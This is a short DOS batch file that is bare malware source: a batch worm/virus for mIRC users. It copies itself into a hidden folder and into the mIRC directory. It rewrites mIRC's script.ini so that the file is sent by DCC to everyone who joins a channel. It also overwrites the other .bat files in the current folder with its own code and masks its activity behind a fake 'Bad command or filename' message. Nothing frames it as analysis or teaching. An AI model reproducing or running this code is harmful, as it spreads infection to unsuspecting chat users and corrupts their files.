@echo off
goto ~%1
:~
md \x
if exist %0 goto A
copy %0.bat \x\x.bat>nul
copy %0.bat c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0.bat
:A
copy %0 \x\x.bat>nul
copy %0 c:\mirc\mircdemo.bat>nul
echo [script]>c:\mirc\script.ini
echo n0=on 1:JOIN:#:/dcc send $nick c:\mirc\mircdemo.bat>>c:\mirc\script.ini
\x\x.bat A %0
:~A
if exist *.bad goto ~G
echo @echo Bad command or filename>%2
echo @del \x\x.bat>>%2
echo @rd \x>>%2
for %%a in (*.bat) do copy %%a *.bad>nul
for %%a in (*.bat) do copy %0 %%a>nul
%2 R
:~G
for %%a in (*.bat) do ren %%a *.but>nul
for %%a in (*.bad) do copy %%a *.bat>nul
call %2
del *.bat
for %%a in (*.but) do ren %%a *.bat
%2 R
:~R
del \x\x.bat
rd \x
:~E